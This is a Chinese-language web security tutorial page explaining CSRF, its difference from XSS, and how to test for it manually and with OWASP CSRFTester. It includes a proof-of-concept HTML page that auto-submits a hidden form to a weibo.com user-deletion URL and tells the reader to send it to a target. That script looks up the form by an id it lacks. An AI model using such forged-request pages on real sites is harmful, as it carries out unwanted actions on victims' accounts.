---
layout: default
---
# ![](../img/hj.jpg)CSRF
>小贱提示： 跨站请求伪造

## ![](../img/github5.png)CSRF原理
举一个简单的例子，例如：
用户A在自己的博客站点中写了一篇文章C，用户B在回复中贴了一张图，在贴图的URL中写入删除文章C的链接,当A看见这张图片的时候，文章C便被不知不觉间删除了。这就是CSRF攻击了。

与XSS的区别
XSS：
```
攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击
```
CSRF：
```
攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击
```

## ![](../img/github6.png)CSRF检测

>小贱提示：有token或g_tk的话直接放弃，不管用

#### 手工检测
1. 找敏感功能：如修改密码，转账，发表留言，转发，收听，关注等
2. 拦截HTTP请求：确定敏感操作之后，使用这项“功能”拦截HTTP请求
  举例：
  ```
  删除用户操作的url为：http://www.weibo.com/deluser.action?id=1024
  通过id参数来删除指定id的用户
  ```
3. 编写html网页放到自己网站上，并把网址发给目标
  ```
    <html>
    	<body>
    		<form name="myform" action="http://www.weibo.com/deluser.action" method="GET">
    			<input type="hidden" name="id" value="5"/>
    		</form>
    		<script>
    			var myform=document.getElementById("myform");
    			myform.submit();
    		</script>
    	</body>
    </html>
  ```

#### 半自动检测（OWASP-CSRFTester-1.0）
步骤1：
```
双击run.bat运行
浏览器设置http代理为127.0.0.1：8008
```
步骤2：
```
使用合法账户访问网站后，点击Start Recording，使用一项网站的“功能”，如新增用户，转发，关注等
csrf会将所有请求都记录下来
```
步骤3：通过CSRF修改并伪造请求
```
CSRFTest将所有的页面表单都抓取下来了，等到抓取到了我们要做测试的页面时，就可以点击Stop Recording ，停止抓取URL，并开始修改相应的表单进行测试
```
步骤4：
```
点Generate HTML
```
__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
